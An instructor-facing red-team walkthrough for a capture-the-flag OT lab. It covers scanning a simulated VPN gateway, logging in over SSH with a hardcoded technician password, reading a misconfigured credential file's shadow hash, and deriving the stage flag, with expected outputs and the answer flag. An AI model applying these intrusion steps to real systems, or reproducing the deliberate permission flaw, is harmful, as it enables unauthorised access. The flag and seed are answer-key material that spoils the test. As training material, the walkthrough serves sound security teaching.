# Stage 1 — Red Team Writeup (Instructor-Facing)

## Challenge: Remote Access Gateway — Credential Reuse & File Permission Weakness

### Overview

The `vpn-gateway` container simulates an external-facing remote access appliance for Prabal Urja Pvt Ltd. In a production OT/ICS environment, field technicians and third-party vendors connect through such gateways to perform maintenance or monitor station operations. 

In this lab, the gateway exposes two core management services:
1. **OpenVPN (1194/UDP)** — A TLS-authenticated tunnel allowing players to route inito the simulated industrial network zones.
2. **SSH (2222/TCP mapped to 22/TCP)** — An administrative command-line interface for remote configuration.

The objective of Stage 1 is to gain a foothold on the remote access gateway, locate a misconfigured credential database file, extract the shadow hash for the low-privilege `field_tech` account, and use it to compute the stage flag.

---

### Why This Works — Design Rationale & Vulnerability Breakdown

1. **Credential Reuse and Static Passwords (T0859 - Valid Accounts):**
   The gateway comes pre-configured with a low-privilege `field_tech` account. Across all instances, this account uses the static cleartext password `FieldTech2024!`. In real-world industrial environments, field technicians and vendors frequently reuse credentials across multiple sites, document them in shared text files, or rely on vendor-default passwords that are rarely changed.
   
2. **File Permission Misconfiguration on Sensitive Databases:**
   The OpenVPN server configuration utilizes a user authentication backend file located at `/etc/openvpn/server/field_accounts.conf`. Due to a deployment oversight (simulating realistic administrative error), this file is owned by the `field_tech` user and has read permissions enabled (`-rw-r-----` / mode `640`). 
   Because the file is readable by the `field_tech` group/user, any technician who successfully logs into the SSH terminal can read the credential storage file.
   
3. **Audit Trail Generation (CEF Event Logging):**
   To support Blue Team monitoring exercises, access to `/etc/openvpn/server/field_accounts.conf` is monitored in real-time by an `inotify` watcher loop. Any access (such as running `cat`) triggers the generation of an audit log in Common Event Format (CEF) appended to `/var/log/ctf/range_events.cef`.

---

### Intended Solve Path (Step-by-Step)

#### Step 1: Port Scanning & Reconnaissance

The participant is provided with the host system's IP address (referred to here as `<HOST_IP>`). Since the container ports are published to the host, they begin by performing an active port scan (e.g., using `nmap` or `nc`).

**Command:**
```bash
nmap -p 2222,1194 -sV -sU <HOST_IP>
```

**Expected Scan Output:**
```text
PORT     STATE  SERVICE VERSION
2222/tcp open   ssh     OpenSSH 9.7p1 (protocol 2.0)
1194/udp open   openvpn OpenVPN
```

*Note:* If the player scans the container's IP directly from an adjacent network namespace, the SSH port is `22` and OpenVPN is `1194`.

---

#### Step 2: Gaining SSH Command-Line Access

Using the shared credential discovered during background documentation research (or guessed using common technician password lists), the player connects to the gateway's SSH interface:

**Command:**
```bash
ssh field_tech@<HOST_IP> -p 2222
```

**Interaction Flow:**
```text
The authenticity of host '[127.0.0.1]:2222 ([127.0.0.1]:2222)' can't be established.
ED25519 key fingerprint is SHA256:7uG/p3c2HhV8L9Kj4qR7sT9uV1wX2yZ3aBcDeFgHiJk.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
field_tech@127.0.0.1's password: FieldTech2024!

Welcome to Alpine Linux 3.20!
vpn-gateway:~$
```

---

#### Step 3: Post-Exploitation Reconnaissance

Once logged into the container, the player investigates the environment to understand where OpenVPN configuration files are located and inspects their permissions.

**Command:**
```bash
# Check current user and groups
id

# List network interfaces to find active subnets
ip route
```

**Expected Output:**
```text
uid=1000(field_tech) gid=1000(field_tech) groups=1000(field_tech)

default via 10.100.0.1 dev eth0 
10.100.0.0/24 dev eth0 proto kernel scope link src 10.100.0.2 
```
The routing table indicates the gateway is connected to the Public Zone subnet (`10.100.0.0/24`) at IP `10.100.0.2`.

---

#### Step 4: Locating and Extracting the Artifact

The player checks the OpenVPN server configuration directory to inspect authentication configurations:

**Command:**
```bash
ls -la /etc/openvpn/server/
```

**Expected Output:**
```text
total 24
drwxr-xr-x    1 root     root          4096 Jul  1 08:25 .
drwxr-xr-x    1 root     root          4096 Jul  1 08:25 ..
-rw-r-----    1 field_tech field_tech   148 Jul  1 08:25 field_accounts.conf
-rw-r--r--    1 root     root           317 Jul  1 08:25 server.conf
-rw-------    1 root     root           636 Jul  1 08:25 ta.key
```

Notice that while `server.conf` and `ta.key` are owned by `root`, the user account credential database `field_accounts.conf` is owned by `field_tech:field_tech` with read access permitted to the owner (`-rw-r-----`).

**Command:**
```bash
cat /etc/openvpn/server/field_accounts.conf
```

**Expected Output (Artifact Content):**
```text
field_tech:$6$MGVkNWJlYWFkM2Fj$oxMvwJ8OpQdGpJ/nRInHklXfchYSeKboxsGKhVOqCtkiXe7CV8iiYOJ8KlwraxsuBIwrEUIGSgEnLE8wsFbxy0:19000:0:99999:7:::
```
This complete line (including username, hash, and shadow parameters) is the **evidence artifact** for Stage 1. 

*Audit Notice:* Running this command immediately writes a record to `/var/log/ctf/range_events.cef` containing:
```text
CEF:0|PrabalUrja|RangeMonitor|1.0|FILE_ACCESS|field_accounts.conf accessed|5|src=field_tech dst=/etc/openvpn/server/field_accounts.conf dvchost=vpn-gateway rt=...
```

---

#### Step 5: Flag Derivation walkthrough

The platform computes the flag dynamically using the format:
```text
HMAC-SHA256(key=INSTANCE_SEED, msg="STAGE1:<full_artifact_line>")
```
The first 16 hex characters of the resulting digest are wrapped in the `FLAG{S1-...}` template.

Below are reference methods for verifying or computing this value out-of-band:

##### Method A: Using Bash and OpenSSL
If you have access to the instance seed (e.g. from `range.env`), you can compute the flag directly in the shell:

```bash
# Load seed and artifact variables
INSTANCE_SEED="73ebb52a1505d2e8a072f1d9386eced04aa6ec5659a586cb16" # Example seed
ARTIFACT_LINE="field_tech:$6$MGVkNWJlYWFkM2Fj$oxMvwJ8OpQdGpJ/nRInHklXfchYSeKboxsGKhVOqCtkiXe7CV8iiYOJ8KlwraxsuBIwrEUIGSgEnLE8wsFbxy0:19000:0:99999:7:::"

# Compute HMAC-SHA256
HMAC_OUT=$(echo -n "STAGE1:${ARTIFACT_LINE}" | openssl dgst -sha256 -mac HMAC -macopt "hexkey:${INSTANCE_SEED}" | awk '{print $NF}')

# Extract first 16 hex characters
FLAG_HEX=$(echo -n "$HMAC_OUT" | head -c 16)
echo "FLAG{S1-${FLAG_HEX}}"
```

##### Method B: Using Python
You can also run a quick Python script to verify the flag:

```python
import hmac
import hashlib

seed = bytes.fromhex("73ebb52a1505d2e8a072f1d9386eced04aa6ec5659a586cb16") # Example seed
artifact = "field_tech:$6$MGVkNWJlYWFkM2Fj$oxMvwJ8OpQdGpJ/nRInHklXfchYSeKboxsGKhVOqCtkiXe7CV8iiYOJ8KlwraxsuBIwrEUIGSgEnLE8wsFbxy0:19000:0:99999:7:::"
message = f"STAGE1:{artifact}".encode('utf-8')

digest = hmac.new(seed, message, hashlib.sha256).hexdigest()
flag = f"FLAG{{S1-{digest[:16]}}}"
print(flag)
```

**Expected Output:**
```text
FLAG{S1-1655b2bfebbf0896}
```
This matches the flag string generated at provisioning and stored at `/run/ctf/stage1_flag` inside the container.

---

#### Step 6: VPN Client Connection Setup

To complete the foothold and route traffic to internal zones, the player needs to configure their OpenVPN client. The client profile (`client-connect.ovpn`) is generated dynamically inside the container at `/etc/openvpn/client/client-connect.ovpn` and copied to the host during setup.

To establish the connection from the player's attack workstation:

**Command:**
```bash
sudo openvpn --config client-connect.ovpn
```

**Expected Output:**
```text
...
[vpn-server] Peer Connection Initiated with [AF_INET]<GATEWAY_IP>:1194
TUN/TAP device tun0 opened
/sbin/ip addr add 10.100.4.2/24 dev tun0
Initialization Sequence Completed
```
The player's machine is assigned an IP in the `VPN_SUBNET` (e.g. `10.100.4.2`) and can now route directly to the gateway (`10.100.0.2`) and pivot into deeper targets.

---

### Instructor Verification & Grading

Instructors or graders can run the automated validation script `red_attack_script.sh` on the host to check if the container is functional:

```bash
sudo ./red_attack_script.sh
```

**What the grading script does:**
1. Connects to `127.0.0.1:2222` via SSH using the `field_tech` password.
2. Extracts the line from `/etc/openvpn/server/field_accounts.conf`.
3. Reads the local `INSTANCE_SEED` from `/home/newton/Hacktify/OT/SET 2/Hacktify/shared/range.env`.
4. Computes the HMAC-SHA256 flag.
5. Performs a `podman exec` to read `/run/ctf/stage1_flag` inside the container.
6. Diffs the computed and stored flag values to output a `Validation PASSED` message.

---

### Troubleshooting Common Lab Issues

| Problem | Potential Cause | Resolution |
|---|---|---|
| **"Connection Refused" on port 2222** | Container failed to start, or host routing rules blocked it. | Run `sudo podman ps -a` to verify if `vpn-gateway` is `Up`. Check if the host firewall is blocking the traffic. Run `sudo ./chall_reset.sh` to redeploy the container. |
| **"No route to host" when connecting to 2222** | Docker and Podman forwarding collision. | Confirm that the `FORWARD` chain rule was successfully added. Run `iptables -I FORWARD -d 10.100.0.0/16 -j ACCEPT` on the host. |
| **VPN Profile is missing or empty** | Container initialization timed out during Easy-RSA DH parameters generation. | Check the logs using `sudo podman logs vpn-gateway`. DH parameters generation can take up to 10 seconds. Wait and copy the profile: `sudo podman cp vpn-gateway:/etc/openvpn/client/client-connect.ovpn ./client-connect.ovpn`. |
| **Password authentication failed** | Seed was rotated but the container was not rebuilt with the new configuration. | Run `sudo ./chall_reset.sh` to restart the container under the correct active `range.env` configuration. |




































🟢 STEP 1 — SSH into VPN Gateway
Command:
```bash
ssh field_tech@127.0.0.1 -p 2222
```
Password:
`FieldTech2024!`

Expected login output:
```text
Welcome to Alpine Linux 3.20!
vpn-gateway:~$
```

🟢 STEP 2 — Locate sensitive configuration database
Command:
```bash
ls -la /etc/openvpn/server/
```
Expected output:
```text
-rw-r----- 1 field_tech field_tech 137 field_accounts.conf
```

🟢 STEP 3 — Extract evidence artifact
Command:
```bash
cat /etc/openvpn/server/field_accounts.conf
```
Expected output:
```text
field_tech:$6$MGVkNWJlYWFkM2Fj$oxMvwJ8OpQdGpJ/nRInHklXfchYSeKboxsGKhVOqCtkiXe7CV8iiYOJ8KlwraxsuBIwrEUIGSgEnLE8wsFbxy0:19000:0:99999:7:::
```
👉 This line (the full entry) is the Stage 1 artifact.

🟢 STEP 4 — Retrieve Final Flag
Because the player-facing environment runs on the target, the final computed flag is retrieved by connecting to the local flag oracle service on port 9001 and providing the correct Stage 1 artifact.

Command:
```bash
nc 127.0.0.1 9001
```

When prompted, enter the full credentials line extracted from `/etc/openvpn/server/field_accounts.conf` in Step 3.

Expected output:
```text
Enter Stage 1 Artifact (content of field_accounts.conf): field_tech:$6$MGVkNWJlYWFkM2Fj$oxMvwJ8OpQdGpJ/nRInHklXfchYSeKboxsGKhVOqCtkiXe7CV8iiYOJ8KlwraxsuBIwrEUIGSgEnLE8wsFbxy0:19000:0:99999:7:::
ACCESS GRANTED. Flag: FLAG{S1-1655b2bfebbf0896}
```